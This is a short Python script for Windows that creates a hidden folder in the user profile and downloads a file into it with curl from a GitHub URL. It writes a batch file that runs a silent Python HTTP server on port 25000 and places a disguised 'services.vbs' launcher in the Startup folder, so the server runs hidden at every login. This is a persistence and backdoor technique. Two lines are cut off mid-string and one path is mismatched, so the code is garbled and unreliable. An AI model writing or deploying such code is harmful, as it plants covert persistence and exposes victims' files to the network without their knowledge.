import os
import sys

user = os.getlogin()
startup_path = fr"C:/Users/{user}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs>

os.chdir(f"C:/Users/{user}/")
os.mkdir("OSTML")
os.system("attrib +h OSTML")
os.chdir(f"C:/Users/{user}/OSTML/")
os.system("curl -o prac.pdf https://raw.githubusercontent.com/darwin08-os/Temp/main/flu>

bat_content = fr'''@echo off
cd "C:/Users/{user}/OSTML/" 
"{sys.executable}" -m http.server 25000'''

vbs_content = fr'''
set code = CreateObject("WScript.shell")
code.Run "C:/Users/{user}/OST/xyz.bat",0,False
'''

with open("xyz.bat","w") as f:
    f.write(bat_content)


os.chdir(startup_path)

with open("services.vbs","w") as f:
    f.write(vbs_content)
